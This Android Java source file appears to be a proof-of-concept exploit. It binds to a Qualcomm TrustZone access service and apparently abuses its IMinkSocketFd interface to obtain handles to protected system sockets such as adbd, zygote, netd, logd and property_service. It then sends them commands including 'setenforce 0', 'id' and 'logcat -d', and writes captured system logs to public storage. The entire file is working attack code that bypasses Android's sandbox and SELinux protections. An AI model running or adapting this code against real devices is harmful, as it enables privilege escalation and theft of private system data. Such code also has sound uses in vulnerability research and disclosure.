package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd mRemoteService;
    private boolean isBound = false;
    private boolean isTesting = false;
    private List<String> successfulSockets = new ArrayList<>();
    private Map<String, Integer> socketFdMap = new HashMap<>();

    private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mRemoteService = IMinkSocketFd.Stub.asInterface(service);
            appendLog("Service bound");
            updateStatus("Bound - starting tests");
            enableButtons(false, true);
            new Thread(() -> executeFullTest()).start();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            appendLog("Service disconnected");
            mRemoteService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);
        btnStart.setOnClickListener(v -> {
            if (!isBound && !isTesting) bindService();
        });
        btnStop.setOnClickListener(v -> {
            if (isBound) {
                unbindService(serviceConnection);
                isBound = false;
                mRemoteService = null;
                enableButtons(true, false);
                updateStatus("Stopped by user");
                appendLog("--- Test stopped ---");
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        isTesting = true;
        appendLog("========== Initial Socket Discovery ==========");

        String[] allSockets = {
            "mdnsd", "ims_datad", "ims_qmid", "adbd", "tombstoned_java_trace",
            "tombstoned_intercept", "tombstoned_crash", "dpmwrapper", "tcm",
            "dpmd", "mlid", "ssgtzd", "ssgqmig", "statsdw", "thermal-send-rule",
            "thermal-recv-passive-client", "thermal-recv-client", "thermal-send-client",
            "netmgr", "qmux_gps", "qmux_bluetooth", "qmux_audio", "qmux_radio",
            "lkspad", "lmkd", "pps", "zygote_secondary", "zygote",
            "fwmarkd", "mdns", "dnsproxyd", "netd", "location", "qdma",
            "logdw", "logdr", "logd", "property_service"
        };

        int[] arrSizes = {1, 5, 10, 100, 1000};

        for (String name : allSockets) {
            String path = "/dev/socket/" + name;
            boolean successAny = false;
            for (int size : arrSizes) {
                int[] iArr = new int[size];
                if (tryConnect(path, iArr)) {
                    successAny = true;
                    successfulSockets.add(path);
                    socketFdMap.put(path, iArr[0]);
                    appendLog("SUCCESS: " + path + " FD=" + iArr[0]);
                    break;
                }
                try { Thread.sleep(50); } catch (InterruptedException ignored) {}
            }
            if (!successAny) {
                appendLog("FAIL: " + path);
            }
        }

        appendLog("========== Deep Interaction Phase ==========");
        for (String path : successfulSockets) {
            int fd = socketFdMap.get(path);
            interactWithSocket(path, fd);
        }

        attemptBlockDeviceAccess();

        appendLog("========== All tests completed ==========");
        updateStatus("Done");
        enableButtons(true, false);
        isTesting = false;
        saveLog();
    }

    private boolean tryConnect(String path, int[] iArr) {
        if (mRemoteService == null) return false;
        try {
            ParcelFileDescriptor pfd = mRemoteService.a(path, iArr);
            if (pfd != null) {
                pfd.close();
                return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    private void interactWithSocket(String path, int fd) {
        appendLog("--- Interacting with " + path + " (FD=" + fd + ") ---");
        try {
            ParcelFileDescriptor pfd = ParcelFileDescriptor.adoptFd(fd);
            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
            if (fdesc == null || !fdesc.valid()) {
                appendLog("  FD invalid, skip");
                pfd.close();
                return;
            }

            OutputStream os = new FileOutputStream(fdesc);
            InputStream is = new FileInputStream(fdesc);

            String[] commands = {
                "help\n",
                "status\n",
                "version\n",
                "getprop\n",
                "id\n",
                "setenforce 0\n",
                "dmesg\n",
                "list\n",
                "dump\n",
                "logcat -d\n",
                "getLog\n",
                "exit\n",
                "\n"
            };

            for (String cmd : commands) {
                appendLog("  Sending: " + cmd.replace("\n", "\\n"));
                try {
                    os.write(cmd.getBytes(StandardCharsets.UTF_8));
                    os.flush();
                    byte[] buffer = new byte[4096];
                    int len = is.read(buffer, 0, buffer.length);
                    if (len > 0) {
                        String response = new String(buffer, 0, len, StandardCharsets.UTF_8);
                        appendLog("  Response: " + response);
                    } else {
                        appendLog("  No response (len=" + len + ")");
                    }
                } catch (Exception e) {
                    appendLog("  Command failed: " + e.getMessage());
                }
                try { Thread.sleep(200); } catch (InterruptedException ignored) {}
            }

            if (path.contains("logd")) {
                appendLog("  Trying logd specific: 'getLog'");
                try {
                    os.write("getLog\n".getBytes(StandardCharsets.UTF_8));
                    os.flush();
                    byte[] buf = new byte[8192];
                    int total = 0;
                    while (total < 8192) {
                        int r = is.read(buf, total, 8192 - total);
                        if (r <= 0) break;
                        total += r;
                    }
                    if (total > 0) {
                        String logData = new String(buf, 0, total, StandardCharsets.UTF_8);
                        appendLog("  Log data (first 500): " + logData.substring(0, Math.min(500, logData.length())));
                        File logFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "logcat_from_socket.txt");
                        try (FileOutputStream fos = new FileOutputStream(logFile)) {
                            fos.write(buf, 0, total);
                        }
                        appendLog("  Log saved to " + logFile.getAbsolutePath());
                    }
                } catch (Exception e) {
                    appendLog("  logd specific failed: " + e.getMessage());
                }
            }

            if (path.contains("property_service")) {
                appendLog("  Trying property_service: 'getprop ro.build.version.sdk'");
                try {
                    os.write("getprop ro.build.version.sdk\n".getBytes(StandardCharsets.UTF_8));
                    os.flush();
                    byte[] buf = new byte[1024];
                    int len = is.read(buf);
                    if (len > 0) {
                        appendLog("  getprop response: " + new String(buf, 0, len, StandardCharsets.UTF_8));
                    }
                } catch (Exception e) {
                    appendLog("  property_service getprop failed: " + e.getMessage());
                }
            }

            pfd.close();
        } catch (Exception e) {
            appendLog("  Interaction exception: " + e.toString());
        }
    }

    private void attemptBlockDeviceAccess() {
        appendLog("--- Attempting block device access via socket (indirect) ---");
        appendLog("  Direct block device access not possible. But we can read system properties from property_service if available.");
        appendLog("  Logcat may contain partition info. We already saved logcat_from_socket.txt.");
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "deep_socket_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== TZAccess Deep Socket PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (isBound) {
            try { unbindService(serviceConnection); } catch (Exception ignored) {}
        }
        saveLog();
    }
}
